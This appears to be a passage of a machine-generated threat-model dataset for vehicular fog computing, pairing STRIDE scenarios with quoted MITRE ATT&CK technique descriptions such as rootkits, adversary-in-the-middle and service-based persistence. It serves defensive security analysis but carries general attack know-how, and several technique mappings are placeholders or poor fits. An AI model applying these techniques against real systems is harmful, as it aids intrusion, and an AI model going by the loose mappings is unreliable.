                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Attacker eavesdrops on unencrypted communication between vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Communication channel is not encrypted",
                    "Role": "System Designer",
                    "Condition": "Lack of encryption protocols in place"
                },
                {
                    "Assumption": "Attacker can intercept network traffic",
                    "Role": "Attacker",
                    "Condition": "Proximity to network infrastructure or network access capabilities"
                },
                {
                    "Assumption": "No network monitoring for unusual interception attempts",
                    "Role": "System Administrator",
                    "Condition": "Lack of network traffic analysis"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data impacting confidentiality.",
            "MITRE ATT&CK Keywords": [
                "eavesdropping",
                "unencrypted communication",
                "data theft",
                "network interception"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Compromised fog node discloses sensitive data to unauthorized parties.",
            "Assumptions": [
                {
                    "Assumption": "Weak access controls on fog nodes",
                    "Role": "System Designer",
                    "Condition": "Insufficient access control mechanisms"
                },
                {
                    "Assumption": "Attackers can exploit fog node vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "Knowledge of and ability to exploit weaknesses"
                },
                {
                    "Assumption": "No data encryption at rest",
                    "Role": "System Designer",
                    "Condition": "Lack of encryption for stored data"
                }
            ],
            "Potential Impact": "Exposure of sensitive vehicle and environment data compromising confidentiality.",
            "MITRE ATT&CK Keywords": [
                "data breach",
                "node compromise",
                "unauthorized data access",
                "sensitive information leakage"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Attacker gains access to cloud services and retrieves stored data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services have exploitable vulnerabilities",
                    "Role": "Cloud Service Provider",
                    "Condition": "Unpatched or misconfigured systems"
                },
                {
                    "Assumption": "Attacker gains access credentials through phishing or other means",
                    "Role": "Attacker",
                    "Condition": "Successful credential theft or social engineering"
                },
                {
                    "Assumption": "No end-to-end encryption or robust access controls",
                    "Role": "System Designer",
                    "Condition": "Weak protection of stored data"
                }
            ],
            "Potential Impact": "Massive data breach impacting confidentiality of all stored data.",
            "MITRE ATT&CK Keywords": [
                "cloud service exploitation",
                "data retrieval",
                "breach",
                "credential theft"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack on fog nodes causing service disruption.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes have limited resources",
                    "Role": "System Designer",
                    "Condition": "Limited processing and networking capacity"
                },
                {
                    "Assumption": "Lack of DDoS mitigation measures",
                    "Role": "System Administrator",
                    "Condition": "No or ineffective DDoS protections"
                },
                {
                    "Assumption": "Attacker can direct a large volume of traffic",
                    "Role": "Attacker",
                    "Condition": "Botnet or other large-scale resources"
                }
            ],
            "Potential Impact": "Denial of service affecting real-time processing and traffic management.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "resource exhaustion",
                "service disruption",
                "network flooding"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious vehicle continuously sends high volumes of data to fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "No rate limiting on data sent by vehicles",
                    "Role": "System Designer",
                    "Condition": "Absence of rate limiting controls"
                },
                {
                    "Assumption": "Fog nodes are not capable of distinguishing malicious from legitimate data",
                    "Role": "System Designer",
                    "Condition": "Lack of data origin verification"
                },
                {
                    "Assumption": "Attacker has access to or control over a vehicle",
                    "Role": "Attacker",
                    "Condition": "Compromise or misuse of vehicle systems"
                }
            ],
            "Potential Impact": "System degradation or crash affecting real-time services and processing.",
            "MITRE ATT&CK Keywords": [
                "data flooding",
                "service disruption",
                "rate limiting bypass",
                "system degradation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Cloud services become overwhelmed by excessive data influx from fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "No overload protection for cloud services",
                    "Role": "System Designer",
                    "Condition": "Lack of mechanisms to handle data surges"
                },
                {
                    "Assumption": "Fog nodes continuously send excessive data due to configuration or malware",
                    "Role": "System Designer/Attacker",
                    "Condition": "Misconfiguration or compromise"
                },
                {
                    "Assumption": "Cloud service scaling mechanisms are insufficient",
                    "Role": "Cloud Service Provider",
                    "Condition": "Inability to scale rapidly to handle data influx"
                }
            ],
            "Potential Impact": "Cloud service outage affecting long-term processing and storage capabilities.",
            "MITRE ATT&CK Keywords": [
                "cloud overload",
                "service disruption",
                "data influx",
                "scalability issues"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attacker exploits vulnerabilities in vehicle systems to gain higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "Known exploitable vulnerabilities in vehicle systems",
                    "Role": "Vehicle Manufacturers",
                    "Condition": "Unpatched or poorly designed software"
                },
                {
                    "Assumption": "Lack of robust access control mechanisms",
                    "Role": "Vehicle System Designers",
                    "Condition": "Weak access control policies"
                },
                {
                    "Assumption": "No intrusion detection in vehicle systems",
                    "Role": "System Administrator",
                    "Condition": "Absence of monitoring or detection mechanisms"
                }
            ],
            "Potential Impact": "Attacker gains control over vehicle systems, impacting security and safety.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "vehicle system exploitation",
                "access control",
                "intrusion"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Compromised fog node allows an attacker to obtain higher privileges in the VFC system.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes have exploitable vulnerabilities",
                    "Role": "Developers",
                    "Condition": "Unpatched software or poor configuration"
                },
                {
                    "Assumption": "Weak or misconfigured privilege management",
                    "Role": "System Administrator",
                    "Condition": "Inadequate privilege control systems"
                },
                {
                    "Assumption": "No effective monitoring of privilege escalation attempts",
                    "Role": "System Administrator",
                    "Condition": "Absence of privilege monitoring"
                }
            ],
            "Potential Impact": "Unauthorized actions and control over the VFC system leading to significant security risks.",
            "MITRE ATT&CK Keywords": [
                "fog node compromise",
                "privilege escalation",
                "system control",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attacker exploits cloud service vulnerabilities to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services have known vulnerabilities",
                    "Role": "Cloud Service Provider",
                    "Condition": "Unpatched or inadequately protected systems"
                },
                {
                    "Assumption": "Weak privilege separation and access controls",
                    "Role": "System Designer",
                    "Condition": "Inadequate privilege management policies"
                },
                {
                    "Assumption": "No frequent monitoring for privilege misuse",
                    "Role": "System Administrator",
                    "Condition": "Lack of continuous monitoring"
                }
            ],
            "Potential Impact": "Full control over cloud services leading to data manipulation, exposure, and service disruption.",
            "MITRE ATT&CK Keywords": [
                "cloud service exploitation",
                "privilege gain",
                "administrative control",
                "data manipulation"
            ],
            "mitre_technique": {
                "name": "Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: Sygnia Elephant Beetle Jan 2022) By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.\n\nThe type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--ac9e6b22-11bf-45d7-9181-c1cb08360931",
                "technique_id": "T1565"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "28",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker masquerades as a legitimate smart vehicle to send false data to fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has knowledge of vehicle communication protocols.",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker can obtain protocol details or reverse-engineer them."
                },
                {
                    "Assumption": "There are inadequate authentication mechanisms between smart vehicles and fog nodes.",
                    "Role": "System Designer",
                    "Condition": "Valid if the system does not enforce strong, mutual authentication."
                },
                {
                    "Assumption": "The attacker has a way to physically or virtually access the communication channel.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker is within range or can intercept communications."
                }
            ],
            "Potential Impact": "May lead to unauthorized data being processed and traffic mishandling.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "identity spoofing",
                "network",
                "edge device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker reconfigures a fog node to impersonate a cloud service.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can compromise a fog node.",
                    "Role": "Attacker",
                    "Condition": "Valid if the fog node has known vulnerabilities or weak defenses."
                },
                {
                    "Assumption": "Fog nodes and cloud services do not mutually authenticate or use weak authentication methods.",
                    "Role": "System Designer",
                    "Condition": "Valid if the authentication mechanism is improperly implemented."
                },
                {
                    "Assumption": "The attacker has access to the fog node's configuration settings.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has administrative or physical access to the node."
                }
            ],
            "Potential Impact": "Could lead to incorrect data being sent to cloud services and potential data loss.",
            "MITRE ATT&CK Keywords": [
                "impersonation",
                "device",
                "configuration manipulation",
                "spoofing"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker pretends to be an RSU to communicate with vehicles.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to RSU communication protocols.",
                    "Role": "Attacker",
                    "Condition": "Valid if the protocols are publicly available or reverse-engineerable."
                },
                {
                    "Assumption": "RSUs and vehicles do not verify each other appropriately.",
                    "Role": "System Designer",
                    "Condition": "Valid if weak or no mutual authentication is in place."
                },
                {
                    "Assumption": "The attacker has a transmission device capable of RSU's frequency bands.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker can modify or use transmission hardware."
                }
            ],
            "Potential Impact": "May cause vehicles to receive harmful instructions or false data, affecting road safety.",
            "MITRE ATT&CK Keywords": [
                "RSU spoofing",
                "communication protocols",
                "network",
                "device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Modification of data in transit between smart vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept data transmissions.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker uses a man-in-the-middle position or similar techniques."
                },
                {
                    "Assumption": "Data is not encrypted or uses weak encryption during transmission.",
                    "Role": "System Designer",
                    "Condition": "Valid if weak or no encryption protocols are applied."
                },
                {
                    "Assumption": "The attacker has the tools to alter the data packets unnoticed.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has specialized hardware or software."
                }
            ],
            "Potential Impact": "Leads to data integrity issues and potentially hazardous real-time decisions by fog nodes.",
            "MITRE ATT&CK Keywords": [
                "data tampering",
                "network",
                "man-in-the-middle",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters firmware or software on fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "The fog node's software/firmware update process is not secure.",
                    "Role": "System Administrator",
                    "Condition": "Valid if updates are not verified or controlled properly."
                },
                {
                    "Assumption": "The attacker has physical or administrative access to the fog node.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker can gain high-level access to the node."
                },
                {
                    "Assumption": "There is no integrity check or weak integrity check on the fog node firmware/software.",
                    "Role": "System Designer",
                    "Condition": "Valid if integrity mechanisms are poorly implemented."
                }
            ],
            "Potential Impact": "Compromises system integrity and could lead to unauthorized operations or data corruption.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "software",
                "fog node"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Compromising data storage on fog nodes by manipulating stored data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can bypass physical and logical access controls.",
                    "Role": "Attacker",
                    "Condition": "Valid if the access controls are weak or poorly implemented."
                },
                {
                    "Assumption": "Data stored on fog nodes does not have integrity verification mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Valid if stored data lacks integrity checks."
                },
                {
                    "Assumption": "The attacker has the capability to alter local data on fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has necessary skills and tools."
                }
            ],
            "Potential Impact": "Results in data integrity issues leading to incorrect processing and decisions.",
            "MITRE ATT&CK Keywords": [
                "data tampering",
                "storage",
                "integrity compromise",
                "fog node"
            ],
            "mitre_technique": {
                "name": "Taint Shared Content",
                "description": "\nAdversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.\n\nA directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot)\n\nAdversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the 